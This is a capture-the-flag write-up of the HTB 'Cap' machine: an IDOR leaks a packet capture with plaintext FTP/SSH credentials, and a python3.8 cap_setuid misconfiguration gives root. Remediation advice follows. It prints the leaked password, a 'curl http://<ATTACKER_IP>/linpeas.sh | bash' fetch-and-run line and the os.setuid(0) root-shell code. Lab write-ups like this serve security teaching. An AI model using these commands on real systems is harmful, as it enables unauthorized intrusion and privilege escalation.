# Write-Up — Cap: IDOR Packet Capture Disclosure to Root via Python Capability Abuse

> **Type:** Web Application / Linux Privilege Escalation Penetration Test (HTB — "Cap", Easy)
> **Target:** `10.129.61.183`
> **Tools:** Nmap, Wireshark, curl, linPEAS, SSH
> **Final Result:** Root access via an IDOR-exposed packet capture leaking plaintext FTP credentials, escalated using a misconfigured Linux capability (`cap_setuid`) on the Python 3.8 binary

---

## 1. Introduction

The target is an easy-difficulty Linux machine running an HTTP dashboard (built with Gunicorn/Python) that performs administrative networking functions — including capturing live traffic — alongside standard FTP and SSH services. The objective was to enumerate the web application, exploit a broken access control flaw to recover another user's data, and use recovered credentials to reach a foothold before escalating to root via a Linux capability misconfiguration.

This box is a compact demonstration of two distinct, low-complexity but high-impact issues:

- **Insecure Direct Object Reference (IDOR)** — a predictable, sequential resource identifier (`/data/<id>`) allowing access to other users' packet captures without any authorization check.
- **Linux capability misuse** — a binary (`python3.8`) granted `cap_setuid`, letting any user who can execute Python effectively become root, without ever needing the SUID bit or a kernel exploit.

## 2. Reconnaissance

### 2.1 Full Port Scan

```bash
ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.129.61.183 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

### 2.2 Service/Version Scan

```bash
nmap -p$ports -sC -sV 10.129.61.183
```

Result:

| Port | Service | Notes |
|------|---------|-------|
| 21/tcp | FTP | Anonymous login tested — disabled |
| 22/tcp | SSH | Standard OpenSSH |
| 80/tcp | HTTP (Gunicorn) | Python-based dashboard application |

Three ports were found open. Gunicorn on port 80 immediately signaled a Python-backed web application, which proved central to the rest of the assessment.

## 3. FTP Enumeration

```bash
ftp 10.129.61.183
```

Attempting an anonymous login failed, ruling out unauthenticated FTP access as an entry point and shifting focus entirely to the web application.

---

## 4. Web Application Enumeration

### 4.1 Initial Browsing

Navigating to `http://10.129.61.183` presented a dashboard offering several administrative networking functions:

- **IP Config** — displayed the output of `ifconfig`.
- **Network Status** — displayed the output of `netstat`.
- **Security Snapshot** — triggered a live packet capture, pausing briefly before offering a downloadable capture file.

The presence of `ifconfig`/`netstat` output strongly suggested the backend directly executes system commands to populate these pages.

### 4.2 Inspecting the Capture Feature

Clicking **Download** after a Security Snapshot retrieved a `.pcap` file. Opened in Wireshark, it contained only the HTTP traffic generated by the current browsing session — nothing sensitive.

### 4.3 Identifying the URL Pattern

The capture creation flow used a URL of the form:

```
/data/<id>
```

with `id` incrementing for each new capture generated. This pattern strongly suggested that captures from **other, earlier users** might still exist and be reachable simply by requesting a lower `id` value.

---

## 5. Vulnerability Analysis — IDOR

### 5.1 The Vulnerability

- **CVE:** N/A — this is an authorization-logic flaw (broken object-level access control)
- **Type:** Insecure Direct Object Reference (IDOR)
- **Authentication:** None required beyond reaching the application itself
- **Impact:** Disclosure of other users' packet capture files, including any credentials transmitted in cleartext protocols during their sessions

### 5.2 Exploiting the IDOR

```
http://10.129.61.183/data/0
```

Requesting capture ID `0` directly returned a packet capture belonging to an earlier user/session, containing considerably more traffic than the current session had generated — confirming the application performed **no ownership check** on the requested capture ID.

---

## 6. Foothold

### 6.1 Analyzing the Leaked Capture

Opening the ID `0` capture in Wireshark revealed **FTP traffic**, including the full authentication exchange. Since FTP transmits credentials in plaintext, the username and password were directly visible in the packet contents:

```
Username: nathan
Password: Buck3tH4TF0RM3!
```

### 6.2 Validating and Reusing the Credentials

The recovered credentials were valid not only for FTP but also for **SSH**:

```bash
ssh nathan@10.129.61.183
```

This provided an authenticated shell as the user `nathan`.

> **Severity: High.** An authorization flaw in the web application indirectly exposed plaintext credentials for two other services, entirely bypassing the need to guess, brute-force, or crack anything.

---

## 7. Privilege Escalation

### 7.1 Staging linPEAS

On the attacking host, the latest `linpeas.sh` was downloaded and served via a simple HTTP server:

```bash
cd /path/to/linpeas
sudo python3 -m http.server 80
```

### 7.2 Fetching and Running linPEAS on the Target

From the SSH session as `nathan`:

```bash
curl http://<ATTACKER_IP>/linpeas.sh | bash
```

### 7.3 Identifying the Vulnerable Capability

The linPEAS output flagged an interesting entry under **files with capabilities**:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

This is **not** a default configuration for the Python interpreter. `cap_net_bind_service` explains why the application could bind to low-numbered ports without running fully as root, but **`cap_setuid`** is the critical finding: it allows a process to change its own UID — including to `0` (root) — without needing the SUID bit set on the binary at all.

### 7.4 Exploiting cap_setuid

```bash
python3.8
```

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

`os.setuid(0)` invokes the underlying `setuid()` system call. Because the Python interpreter itself carries the `cap_setuid` capability, this call succeeds even though `nathan` is not root and the binary has no SUID bit — resulting in a `/bin/bash` shell running with **UID 0**.

### 7.5 Root Confirmation and Flag

```bash
id
```

```
uid=0(root) gid=1000(nathan) groups=1000(nathan)
```

```bash
cat /root/root.txt
```

This returned the final flag, completing the machine. The user flag, retrieved earlier from `nathan`'s home directory, completed the pair.

> **Severity: Critical.** A single misassigned Linux capability on a widely-used interpreter binary allowed any user able to invoke Python to escalate directly to root — no exploit code, no kernel vulnerability, and no SUID bit required.

## 8. Full Attack Chain

```
[ Recon: Nmap ]
       │
       ▼
[ FTP (21, anon disabled) + SSH (22) + Gunicorn/Python HTTP (80) ]
       │
       ▼
[ Dashboard: IP Config / Network Status / Security Snapshot ]
       │
       ▼
[ Capture download → /data/<id> URL pattern noticed ]
       │
       ▼
[ /data/0 requested → IDOR: another user's capture retrieved ]
       │
       ▼
[ Wireshark analysis → cleartext FTP credentials (nathan) found ]
       │
       ▼
[ SSH as nathan → user.txt read ]
       │
       ▼
[ linpeas.sh fetched via curl | bash ]
       │
       ▼
[ /usr/bin/python3.8 found with cap_setuid ]
       │
       ▼
[ python3.8 → os.setuid(0) → os.system("/bin/bash") → root shell ]
       │
       ▼
[ root.txt read ]
```

**Lesson:** Neither stage of this compromise involved writing exploit code. The first stage was simply noticing a predictable identifier in a URL; the second was recognizing that a single non-default capability flag on a common interpreter binary is functionally equivalent to a root-level backdoor.

## 9. Remediation Summary

| # | Finding | Severity | Remediation |
|---|---------|----------|--------------|
| 1 | IDOR on `/data/<id>` allowing access to other users' packet captures | **High** | Enforce server-side ownership/authorization checks on every resource access — verify the requesting session is permitted to access the specific capture ID requested, and use non-sequential, unguessable identifiers (e.g., UUIDs) as a defense-in-depth measure. |
| 2 | Plaintext FTP authentication traffic capturable and disclosed via the above IDOR | **High** | Migrate FTP to FTPS or SFTP so credentials are never transmitted in cleartext, even if a capture is later exposed. |
| 3 | Password reuse across FTP and SSH for the same account | **Medium** | Use unique credentials per service; consider SSH key-based authentication instead of password authentication entirely. |
| 4 | `/usr/bin/python3.8` granted `cap_setuid` (and `cap_net_bind_service`) | **Critical** | Remove unnecessary capabilities from interpreter binaries (`setcap -r /usr/bin/python3.8`); if privileged port binding is required, use a dedicated, minimal-capability wrapper or a reverse proxy running as a low-privileged user instead of granting broad capabilities to a general-purpose interpreter. |
| 5 | Web application executes system commands (`ifconfig`, `netstat`, packet capture) on behalf of users | **Medium** | Where system-level administrative functions must be exposed via a web UI, run them under a tightly scoped service account with only the specific capabilities required (e.g., `cap_net_raw` for packet capture) — never a general-purpose interpreter with broad capabilities. |

---

## 10. Conclusion

This box is a compact illustration of two principles that remain highly relevant in real-world assessments:

1. **Predictable identifiers are a liability even without a "real" exploit.** No injection, no memory corruption — just changing a number in a URL was enough to access another user's sensitive data.
2. **Linux capabilities are frequently overlooked in privilege escalation reviews.** Teams that carefully avoid setting the SUID bit can still hand out root-equivalent access via `cap_setuid`, `cap_dac_override`, and similar capabilities, which don't show up in a typical SUID-focused audit.

The fix, as with most findings of this class, is straightforward: authorize every request server-side regardless of how the resource is identified, and audit binary capabilities with the same rigor traditionally reserved for SUID/SGID bits.
